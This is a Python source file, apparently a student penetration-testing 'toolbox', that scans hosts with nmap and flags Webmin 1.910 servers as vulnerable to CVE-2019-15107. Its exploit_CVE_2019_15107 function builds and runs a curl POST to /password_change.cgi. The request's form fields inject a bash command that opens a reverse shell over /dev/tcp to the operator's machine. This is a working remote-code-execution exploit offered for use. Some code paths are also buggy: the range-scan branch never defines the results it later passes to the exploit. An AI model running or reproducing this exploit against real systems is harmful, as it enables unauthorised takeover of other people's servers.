import csv
import nmap
import requests
import subprocess
import ipaddress
import sys
import argparse
import netifaces as ni
from tqdm import tqdm

BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[31m"
ENDC = "\033[0m"

def display_banner():
    banner = """
████████╗ ██████╗  ██████╗ ██╗     ██████╗  ██████╗ ██╗  ██╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔══██╗██╔═══██╗╚██╗██╔╝
   ██║   ██║   ██║██║   ██║██║     ██████╔╝██║   ██║ ╚███╔╝ 
   ██║   ██║   ██║██║   ██║██║     ██╔══██╗██║   ██║ ██╔██╗ 
   ██║   ╚██████╔╝╚██████╔╝███████╗██████╔╝╚██████╔╝██╔╝ ██╗
   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
         Justine Fort - Evan Dessert - Mathis Fecan          
"""
    print(BLUE + banner + ENDC)



def get_current_ip():
    try:
        # Get a list of network interfaces
        interfaces = ni.interfaces()
        
        # Iterate over the network interfaces
        for interface in interfaces:
            # Get the IP addresses associated with the interface
            addresses = ni.ifaddresses(interface)
            if ni.AF_INET in addresses:
                # Check if the interface has an IPv4 address
                ip_info = addresses[ni.AF_INET][0]
                lhost = ip_info['addr']
                
                # Skip loopback and link-local addresses
                if not lhost.startswith('127.') and not lhost.startswith('169.254.'):
                    return lhost
    except Exception as e:
        print("Error:", e)

# Function to validate an IP address
def validate_ip_address(ip_address):
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False

def validate_network_range(network_range):
    try:
        ipaddress.ip_network(network_range)
        return True
    except ValueError:
        return False

def choose_scan_type():
    try:
        scan_type = input("Do you want to scan an IP or a range? (I/R): ").lower()
        if scan_type == 'i' or scan_type == 'r':
            return scan_type
        else:
            raise ValueError("Invalid input. Please enter 'IP' or 'range'.")
    except ValueError as ve:
        print(ve)
        sys.exit(1)

def ask_ip_range(scan_type):
    if scan_type == "i":
        while True:
            adresse_ip = input(ENDC + "Entrez une adresse IP : ")
            if validate_ip_address(adresse_ip):
                return adresse_ip
                break
            else:
                print(RED +"Format d'adresse IP invalide. Veuillez entrer une adresse IP valide.")
    elif scan_type == "r":
        while True:
            network_range = input(ENDC + "Entrez une adresse réseau (192.168.1.0/24) : ")
            if validate_network_range(network_range):
                return network_range
                break
            else:
                print(RED +"Format d'adresse réseau invalide. Veuillez entrer une adresse valide.")

def net_fullscan_ask():
    net_fullscan_asking = input(ENDC + "Souhaitez vous effecture un scan en profondeur pour chaque hote découvert ? (O/n)").lower()
    if net_fullscan_asking == "o" or net_fullscan_asking == "":
        net_fullscan = True
    else:
        net_fullscan = False
    return net_fullscan

# Function to perform a simple port scan
def simple_scan():
    result_list = []
    scanner = nmap.PortScanner()
    try:
        scanner.scan(adresse_ip, arguments='-T5 -Pn -p 8888,10000,8080')
    except nmap.PortScannerError as e:
        print("Erreur lors de l'analyse de l'adresse IP :", e)
        return None, None
    for host in scanner.all_hosts():
        if 'tcp' in scanner[host]:
            for port in scanner[host]['tcp'].keys():
                state = scanner[host]['tcp'][port]['state']
                if state == 'open':
                    result_list.append(port)
    try:
        if not (result_list):
            raise ValueError(RED + "❌ No open port found on the specified host." + ENDC)
        else :
            print (f"Ports ouvers: {str(result_list)}\n")
        return result_list
    except ValueError as ve:
        print(ve)
        sys.exit(1)

def network_simple_scan(network_range):
    hosts_list = []
    scanner = nmap.PortScanner()
    try:
        scanner.scan(network_range, arguments='-T5 -sn -PU -PS -PA')
    except nmap.PortScannerError as e:
        print("Erreur lors de l'analyse du réseau :", e)
        sys.exit(1)
        return None, None
    for host in scanner.all_hosts():
        hosts_list.append(host)
        hostcount = len(hosts_list)
    try:
        if not (hosts_list):
            raise ValueError(RED + "❌ No available host found on the specified network." + ENDC)
        else :
            print (BLUE + f"Available Hosts:{ENDC}\n{hosts_list}\n")
            print (BLUE + f"Nobre d'hotes : {hostcount}")
        return network_range and hosts_list
    except ValueError as ve:
        print(ve)
        sys.exit(1)

# Function to perform a detailed port scan
def better_scan(adresse_ip, open_ports):
    result_dict = {}  # Dictionary to store scan results for each IP
    scanner = nmap.PortScanner()

    try:
        scanner.scan(adresse_ip, arguments='-A')  # Use '-A' for aggressive scan
    except nmap.PortScannerError as e:
        print(f"Error scanning host {adresse_ip}: {e}")
        return None

    for port in open_ports:
        try:
            # Extract scan results
            scan_result = scanner[adresse_ip]['tcp'][port]
            protocol = 'tcp'
            port_number = port
            service_name = scan_result['name']
            state = scan_result['state']
            product = scan_result['product'] if 'product' in scan_result else None
            extra_info = scan_result['extrainfo'] if 'extrainfo' in scan_result else None
            version = scan_result['version'] if 'version' in scan_result else None
            
            # Print scan results
            print(GREEN + f"  Port: {port_number}" + ENDC)
            print(f"    Service: {service_name}")
            print(f"    State: {state}")
            print(f"    Product: {product}")
            print(f"    Version: {version}")
            print(f"    Extra Info: {extra_info}")
            
            # Check for CVE-2019-15107 vulnerability
            vulnerability_detected = check_CVE_2019_15107_vulnerability(service_name, extra_info, version)
            
            # Store scan results in the dictionary
            if adresse_ip not in result_dict:
                result_dict[adresse_ip] = {'hostname': scanner[adresse_ip].hostname(),
                                            'ports': {}}
            result_dict[adresse_ip]['ports'][port_number] = {'protocol': protocol,
                                                             'name': service_name,
                                                             'state': state,
                                                             'product': product,
                                                             'extrainfo': extra_info,
                                                             'version': version,
                                                             'vulnerability_detected': vulnerability_detected}
            
        except nmap.PortScannerError as e:
            print(f"Error scanning port {port}:", e)
            
    return result_dict

def network_fullscan(net_fullscan, hosts_list):
    result_dict_nw = {}  # Dictionary to store detailed scan results for each IP
    if net_fullscan:
        print("Starting deep scan on each host and port discovered...")
        with tqdm(total=len(hosts_list)) as pbar:
            for host in hosts_list:
                scanner = nmap.PortScanner()
                try:
                    scanner.scan(host, arguments='-T5 -Pn -p 8080,10000')
                except nmap.PortScannerError as e:
                    print(f"Error scanning host {host}: {e}")
                    continue
                open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
                if not open_ports:
                    open_ports_str = "none"
                else:
                    open_ports_str = ", ".join(map(str, open_ports))
                print(f"Open ports for host {host}: {open_ports_str}")
                if open_ports:
                    result_dict_nw[host] = better_scan(host, open_ports)
                pbar.update(1)

def check_CVE_2019_15107_vulnerability(service_name, extra_info, version):
    if ('service' in service_name.lower() or 'webmin' in extra_info.lower()) and '1.910' in version:
        print(GREEN + "Vulnerability CVE-2019-15107 detected!" + ENDC)
        return True
    else:
        print(RED + "Vulnerability CVE-2019-15107 not detected!" + ENDC)
        return False

def ask_exploitation_phase():
    while True:
        choice = input("Do you want to proceed to the exploitation phase? (y/N): ").strip().lower()
        if choice in ['y', 'yes']:
            return True
        elif choice in ['', 'n', 'no']:
            return False
        else:
            print("Invalid choice. Please enter 'Y' or 'N'.")

def exploit_CVE_2019_15107(result_dict,lhost):
    for target_ip, details in result_dict.items():
        for port, port_details in details['ports'].items():
            if port_details['vulnerability_detected']:
                target_port = port 
                lport = "4443"
                vuln_path = "/password_change.cgi"

                exploit_cmd = (
                    f"curl -sk -X POST 'https://{target_ip}:{target_port}{vuln_path}' "
                    "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47' "
                    f"-H 'Referer: https://{target_ip}:{target_port}/' "
                    "-H 'Content-Type: application/x-www-form-urlencoded' "
                    f"-d 'expired=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27&new1=SmKUYgMFtixFlLt6nggby&new2=SmKUYgMFtixFlLt6nggby&old=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27'"
                )
                try:
                    subprocess.run(
                        exploit_cmd, shell=True, check=True, timeout=3
                    )
                except subprocess.TimeoutExpired:
                    print(f"Exploit attempt done, reverse shell sent to Villain {lhost}")
                finally:
                    print("Script ended.")

# Prompt for user input
display_banner()
scan_type = choose_scan_type()

# Prompt for network range scan
if scan_type == "r":
    network_range = ask_ip_range(scan_type)
    hosts_list = network_simple_scan(network_range)
    net_fullscan = net_fullscan_ask()
    if net_fullscan:  # Check if net_fullscan is True
        network_fullscan(net_fullscan, hosts_list)

# Prompt for single IP scan
else:
    adresse_ip = ask_ip_range(scan_type)
    result_list = simple_scan()
    # Perform the detailed scan and export results to CSV
    result_dict = better_scan(adresse_ip, result_list)

if ask_exploitation_phase():
    lhost = get_current_ip()
    exploit_CVE_2019_15107(result_dict, lhost)
else:
    print("Exploitation phase skipped.")
